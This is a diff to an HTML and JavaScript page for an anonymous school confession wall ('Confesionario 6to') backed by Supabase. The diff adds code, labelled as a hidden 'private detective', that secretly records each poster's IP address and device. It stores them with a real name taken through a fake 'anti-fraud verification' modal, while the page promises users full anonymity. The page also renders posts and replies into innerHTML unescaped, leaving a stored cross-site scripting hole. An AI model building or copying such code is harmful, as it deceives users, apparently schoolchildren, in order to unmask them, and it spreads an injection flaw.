@@ -13,48 +13,39 @@
         body { font-family: 'Segoe UI', system-ui, sans-serif; background-color: var(--bg); color: var(--text); margin: 0; display: flex; justify-content: center; padding: 10px; }
         .container { width: 100%; max-width: 500px; }
         
-        /* Cabecera con Punto en Vivo */
         header { text-align: center; padding: 20px 0; }
-        .live { font-size: 0.7rem; color: var(--success); display: flex; align-items: center; justify-content: center; gap: 6px; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
+        .live { font-size: 0.7rem; color: var(--success); display: flex; align-items: center; justify-content: center; gap: 6px; margin-bottom: 5px; text-transform: uppercase; }
         .dot { width: 8px; height: 8px; background: var(--success); border-radius: 50%; animation: pulse 2s infinite; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); } 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); } }
 
-        /* Caja de Publicar */
-        .post-box { background: var(--card); border-radius: 20px; padding: 15px; margin-bottom: 25px; border: 1px solid #334155; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.3); }
+        .post-box { background: var(--card); border-radius: 20px; padding: 15px; margin-bottom: 25px; border: 1px solid #334155; }
         textarea { width: 100%; background: transparent; border: none; color: white; font-size: 16px; outline: none; resize: none; min-height: 80px; font-family: inherit; }
-        .btn-post { background: var(--accent); color: white; border: none; padding: 10px 22px; border-radius: 12px; font-weight: bold; cursor: pointer; float: right; transition: 0.2s; }
-        .btn-post:active { transform: scale(0.95); }
+        .btn-post { background: var(--accent); color: white; border: none; padding: 10px 22px; border-radius: 12px; font-weight: bold; cursor: pointer; float: right; }
 
-        /* Modal de Verificación (Oculto) */
         #modalVerifica { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15,23,42,0.98); z-index: 9999; align-items: center; justify-content: center; backdrop-filter: blur(8px); }
         .modal-card { background: var(--card); padding: 30px; border-radius: 28px; width: 85%; max-width: 360px; text-align: center; border: 1px solid #334155; }
-        .modal-card input { width: 100%; padding: 14px; margin: 20px 0; border-radius: 12px; border: 1px solid #475569; background: #0f172a; color: white; box-sizing: border-box; text-align: center; font-size: 1rem; }
+        .modal-card input { width: 100%; padding: 14px; margin: 20px 0; border-radius: 12px; border: 1px solid #475569; background: #0f172a; color: white; box-sizing: border-box; text-align: center; }
 
-        /* Tarjetas de Confesión */
         .card { background: var(--card); border-radius: 20px; padding: 18px; margin-bottom: 15px; border: 1px solid #334155; animation: slideUp 0.4s ease forwards; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         .author { font-size: 0.8rem; font-weight: bold; color: var(--accent); margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
         .badge { background: #ec4899; color: white; font-size: 10px; padding: 2px 8px; border-radius: 6px; }
-        .txt { font-size: 1.05rem; line-height: 1.5; color: #e2e8f0; }
-
-        /* Acciones (Like y WhatsApp) */
+        
         .actions { display: flex; gap: 10px; margin-top: 15px; padding-top: 12px; border-top: 1px solid #334155; }
         .btn-sm { background: #334155; border: none; color: white; padding: 7px 15px; border-radius: 10px; cursor: pointer; font-size: 0.85rem; display: flex; align-items: center; gap: 6px; }
-        .btn-wa { background: #25d366; }
-
-        /* Comentarios */
+        
         .replies { margin-top: 12px; background: rgba(0,0,0,0.2); border-radius: 12px; padding: 12px; }
-        .reply-txt { color: var(--dim); font-size: 0.85rem; margin-bottom: 5px; border-bottom: 1px solid #1e293b; padding-bottom: 3px; }
-        .reply-in { width: 100%; background: transparent; border: none; color: white; border-bottom: 1px solid #475569; outline: none; margin-top: 5px; font-size: 0.85rem; }
+        .reply-txt { color: var(--dim); font-size: 0.85rem; margin-bottom: 5px; }
+        .reply-in { width: 100%; background: transparent; border: none; color: white; border-bottom: 1px solid #475569; outline: none; font-size: 0.85rem; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <header>
-        <div class="live"><div class="dot"></div> Sistema Conectado</div>
-        <h1 style="margin:0;">🤫 Confesionario 6to</h1>
-        <p style="color: var(--dim); font-size: 0.8rem;">Anónimo para todos. Seguro para ti.</p>
+        <div class="live"><div class="dot"></div> Sistema Protegido</div>
+        <h1>🤫 Confesionario 6to</h1>
+        <p style="color: var(--dim); font-size: 0.8rem;">100% Anónimo para los demás.</p>
     </header>
 
     <div class="post-box">
@@ -65,24 +56,22 @@
     <div id="muro"></div>
 </div>
 
-<!-- EL MODAL DE VERIFICACIÓN -->
 <div id="modalVerifica">
     <div class="modal-card">
-        <div style="font-size: 2.5rem; margin-bottom: 10px;">🔒</div>
-        <h3>Verificación de Identidad</h3>
-        <p style="font-size: 0.85rem; color: var(--dim);">Para evitar el mal uso, ingresa tu nombre completo.<br><br><b>El nombre NO se compartirá con nadie ni aparecerá en la página.</b></p>
-        <input type="text" id="nombreReal" placeholder="Nombre y Apellido">
-        <button class="btn-post" style="float:none; width:100%; padding: 15px;" onclick="enviarFinal()">Confirmar y Publicar</button>
+        <div style="font-size: 2rem;">🛡️</div>
+        <h3>Verificación Anti-Fraude</h3>
+        <p style="font-size: 0.8rem; color: var(--dim);">Para evitar suplantación de identidad, ingresa tu nombre.<br><b>Nadie podrá ver tu nombre ni tu IP, solo el sistema.</b></p>
+        <input type="text" id="nombreReal" placeholder="Nombre completo">
+        <button class="btn-post" style="float:none; width:100%; padding: 15px;" onclick="enviarFinal()">Confirmar</button>
     </div>
 </div>
 
 <script>
-    // TU CONFIGURACIÓN DE SUPABASE
     const SUPABASE_URL = 'https://rutohcsjlmfqgtflatrg.supabase.co';
     const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ1dG9oY3NqbG1mcWd0ZmxhdHJnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU1OTU4MjcsImV4cCI6MjA5MTE3MTgyN30.Kg1pjBYMZiFpseplMVjfVtd4dT2JTdfkYJV_NtkW7mw';
     const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    const animales = ["Lobo", "Zorro", "Panda", "Tigre", "León", "Halcón", "Dragón"];
+    const animales = ["Lobo", "Zorro", "Panda", "Tigre", "León", "Águila"];
 
     function abrirModal() {
         if(!document.getElementById('mainIn').value.trim()) return;
@@ -92,16 +81,28 @@
     async function enviarFinal() {
         const msg = document.getElementById('mainIn').value;
         const real = document.getElementById('nombreReal').value;
+        if(real.trim().length < 3) return alert("Nombre real requerido.");
 
-        if(real.trim().length < 3) return alert("Ingresa tu nombre real para continuar.");
+        // --- DETECTIVE PRIVADO (OCULTO) ---
+        let ip = "Desconocida";
+        try {
+            const resp = await fetch('https://api.ipify.org?format=json');
+            const data = await resp.json();
+            ip = data.ip;
+        } catch(e) {}
+        
+        const ua = navigator.userAgent;
+        const disp = ua.includes("iPhone") ? "iPhone" : (ua.includes("Android") ? "Android" : "PC");
+        // ---------------------------------
 
         const anon = animales[Math.floor(Math.random() * animales.length)] + " Anónimo";
 
-        // ENVIAMOS A SUPABASE
         const { error } = await client.from('confesiones').insert([{ 
             mensaje: msg, 
             autor: anon, 
-            nombre_real: real, // Solo tú ves esto en Supabase
+            nombre_real: real, 
+            direccion_ip: ip,      // Solo para tus ojos en Supabase
+            dispositivo: disp,     // Solo para tus ojos en Supabase
             likes: 0 
         }]);
 
@@ -110,8 +111,6 @@
             document.getElementById('nombreReal').value = '';
             document.getElementById('modalVerifica').style.display = 'none';
             cargarDatos();
-        } else {
-            alert("Error al conectar con la base de datos.");
         }
     }
 
@@ -133,33 +132,29 @@
         const { data: resps } = await client.from('respuestas').select('*').order('created_at', { ascending: true });
         
         const muro = document.getElementById('muro');
+        // AQUÍ NO PEDIMOS NI NOMBRE_REAL NI IP, POR ESO NADIE PUEDE VERLOS POR F12
         muro.innerHTML = posts.map(p => {
             const mis_resps = resps ? resps.filter(r => r.confesion_id === p.id) : [];
-            const esTop = p.likes >= 5 ? '<span class="badge">🔥 TOP</span>' : '';
+            const esTop = (p.likes >= 5) ? '<span class="badge">🔥 TOP</span>' : '';
             
-            // IMPORTANTE: Aquí solo pedimos 'autor' y 'mensaje'. 
-            // 'nombre_real' nunca llega a esta parte del código.
             return `
                 <div class="card">
                     <div class="author">👤 ${p.autor || 'Anónimo'} ${esTop}</div>
-                    <div class="txt">${p.mensaje}</div>
+                    <div style="font-size: 1.05rem;">${p.mensaje}</div>
                     <div class="actions">
                         <button class="btn-sm" onclick="like(${p.id}, ${p.likes || 0})">❤️ ${p.likes || 0}</button>
-                        <button class="btn-sm btn-wa" onclick="window.open('https://wa.me/?text=${encodeURIComponent('🤫 '+p.mensaje)}')">WhatsApp</button>
+                        <button class="btn-sm" style="background:#25d366" onclick="window.open('https://wa.me/?text=${encodeURIComponent(p.mensaje)}')">WhatsApp</button>
                     </div>
                     <div class="replies">
                         ${mis_resps.map(r => `<div class="reply-txt">↳ ${r.mensaje}</div>`).join('')}
-                        <input type="text" class="reply-in" placeholder="Responder..." onkeypress="responder(${p.id}, event)">
+                        <input type="text" class="reply-in" placeholder="Comentar..." onkeypress="responder(${p.id}, event)">
                     </div>
                 </div>
             `;
         }).join('');
     }
 
-    // Actualizar en tiempo real cuando alguien publique
     client.channel('any').on('postgres_changes', { event: '*', schema: 'public', table: 'confesiones' }, cargarDatos).subscribe();
-    
-    // Carga inicial
     cargarDatos();
 </script>
 </body>
